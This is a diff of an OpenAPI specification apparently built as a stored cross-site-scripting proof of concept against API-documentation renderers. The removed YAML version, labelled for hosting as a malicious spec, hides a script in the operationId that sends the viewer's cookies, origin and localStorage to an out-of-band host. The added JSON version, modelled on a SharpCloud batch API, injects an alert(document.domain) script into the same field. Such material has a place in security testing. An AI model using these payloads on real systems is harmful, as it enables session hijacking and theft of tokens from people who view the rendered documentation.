@@ -1,23 +1,54 @@
-# Host this on your server as malicious-spec.yaml
-openapi: 3.0.0
-info:
-  title: API Documentation
-  version: 1.0.0
-paths:
-  /users:
-    get:
-      operationId: |
-        legitimate_id<script>
-        fetch('https://sxsqrhfknbmbrzsrhkhmeng8nou5pc8db.oast.fun/', {
-          method: 'POST',
-          mode: 'no-cors',
-          body: JSON.stringify({
-            cookies: document.cookie,
-            origin: window.location.origin,
-            localStorage: JSON.stringify(localStorage)
-          })
-        })
-        </script>
-      responses:
-        '200':
-          description: Success
+{
+  "openapi": "3.0.1",
+  "info": {
+    "title": "Public API V2 (Batch) (beta)",
+    "description": "This API is currently in beta and it may change based on feedback",
+    "termsOfService": "https://www.sharpcloud.com/terms",
+    "contact": {
+      "name": "Contact",
+      "url": "https://www.sharpcloud.com/support"
+    },
+    "license": {
+      "name": "License",
+      "url": "https://www.sharpcloud.com/pricing"
+    },
+    "version": "v2"
+  },
+  "paths": {
+    "/api/v2/batchqueryItems/{storyId}": {
+      "get": {
+        "operationId": "getBatchQueryItems<script>alert(document.domain)</script>",
+        "tags": [
+          "Batch"
+        ],
+        "summary": "Gets the batch query items",
+        "description": "If no query is supplied, SharpCloud will attempt to return all item data(all categories and attributes). \r\n\r\nUnless specified, the maximum number of items returned is 1,000.",
+        "parameters": [
+          {
+            "name": "storyId",
+            "in": "path",
+            "description": "Your unique Story Identifier",
+            "required": true,
+            "schema": {
+              "type": "string",
+              "format": "uuid"
+            }
+          },
+          {
+            "name": "query",
+            "in": "query",
+            "description": "Base64 encoded query object",
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "responses": {
+          "200": {
+            "description": "Success"
+          }
+        }
+      }
+    }
+  }
+}
